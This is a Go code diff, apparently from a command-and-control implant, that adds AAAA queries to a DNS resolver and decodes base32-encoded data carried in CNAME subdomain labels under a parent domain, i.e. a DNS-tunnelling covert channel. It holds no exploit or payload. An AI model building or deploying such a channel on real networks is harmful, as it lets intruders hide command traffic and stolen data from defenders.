@@ -22,6 +22,7 @@ import (
 	"crypto/rand"
 	"encoding/binary"
 	"errors"
+	"hash/crc32"
 	"strings"
 	"time"
 
@@ -39,7 +40,7 @@ var (
 )
 
 // NewGenericResolver - Instantiate a new generic resolver
-func NewGenericResolver(address string, port string, retryWait time.Duration, retries int, timeout time.Duration) DNSResolver {
+func NewGenericResolver(address string, port string, retryWait time.Duration, retries int, timeout time.Duration, parent string) DNSResolver {
 	if retries < 1 {
 		retries = 1
 	}
@@ -52,6 +53,7 @@ func NewGenericResolver(address string, port string, retryWait time.Duration, re
 			WriteTimeout: timeout,
 		},
 		base64: encoders.Base64{},
+		parent: parent,
 	}
 }
 
@@ -62,6 +64,7 @@ type GenericResolver struct {
 	retryWait time.Duration
 	resolver  *dns.Client
 	base64    encoders.Base64
+	parent    string
 }
 
 // Address - Return the address of the resolver
@@ -109,6 +112,66 @@ func (r *GenericResolver) a(domain string) ([]byte, time.Duration, error) {
 			log.Printf("[dns] answer (a): %v", answer.A)
 			// {{end}}
 			records = append(records, []byte(answer.A)...)
+		}
+	}
+	return records, rtt, err
+}
+
+// AAAA - Query for AAAA records
+func (r *GenericResolver) AAAA(domain string) ([]byte, time.Duration, error) {
+	var resp []byte
+	var rtt time.Duration
+	var err error
+	for attempt := 0; attempt < r.retries; attempt++ {
+		resp, rtt, err = r.aaaa(domain)
+		if err == nil {
+			break
+		}
+		// {{if .Config.Debug}}
+		log.Printf("[dns] query error: %s (retry wait: %s)", err, r.retryWait)
+		// {{end}}
+		time.Sleep(r.retryWait)
+	}
+	return resp, rtt, err
+}
+
+func (r *GenericResolver) aaaa(domain string) ([]byte, time.Duration, error) {
+	// {{if .Config.Debug}}
+	log.Printf("[dns] %s->AAAA record of %s ?", r.address, domain)
+	// {{end}}
+	resp, rtt, err := r.localQuery(domain, dns.TypeAAAA)
+	if err != nil {
+		return nil, rtt, err
+	}
+	if resp.Rcode != dns.RcodeSuccess {
+		// {{if .Config.Debug}}
+		log.Printf("[dns] error response status: %v", resp.Rcode)
+		// {{end}}
+		return nil, rtt, ErrInvalidRcode
+	}
+	records := []byte{}
+	for _, answer := range resp.Answer {
+		switch answer := answer.(type) {
+		case *dns.CNAME:
+			// {{if .Config.Debug}}
+			log.Printf("[dns] answer (cname): %s", answer.Target)
+			// {{end}}
+
+			target := answer.Target
+			if 0 < len(target) {
+
+				b := []byte(target)
+				subdomain := b[:len(b)-len(r.parent)]
+				// {{if .Config.Debug}}
+				log.Printf("[dns] processing req for subdomain = %s", subdomain)
+				// {{end}}
+				msgData, _, err := r.decodeSubdata(string(subdomain))
+				if err != nil {
+					break
+				}
+				records = append(records, []byte(msgData)...)
+
+			}
 		}
 	}
 	return records, rtt, err
@@ -184,4 +247,24 @@ func headerID() uint16 {
 	buf := make([]byte, 2)
 	rand.Read(buf)
 	return binary.LittleEndian.Uint16(buf)
+}
+
+// Parse subdomain as data and calculate the CRC32 checksum, I decided to add the
+// checksum calculation here to ensure that no one accidentally calculates the crc32
+// of the plaintext data (that would be very bad).
+func (r *GenericResolver) decodeSubdata(subdomain string) ([]byte, uint32, error) {
+	subdata := strings.Join(strings.Split(subdomain, "."), "")
+	// {{if .Config.Debug}}
+	log.Printf("subdata = %s", subdata)
+	// {{end}}
+	encoder := encoders.Base32{}
+	data, err := encoder.Decode([]byte(subdata))
+	if err == nil {
+		return data, crc32.ChecksumIEEE(data), nil
+	}
+	// {{if .Config.Debug}}
+	log.Printf("failed to decode subdata with %#v (%s)", encoder, err)
+	// {{end}}
+
+	return nil, 0, ErrInvalidMsg
 }
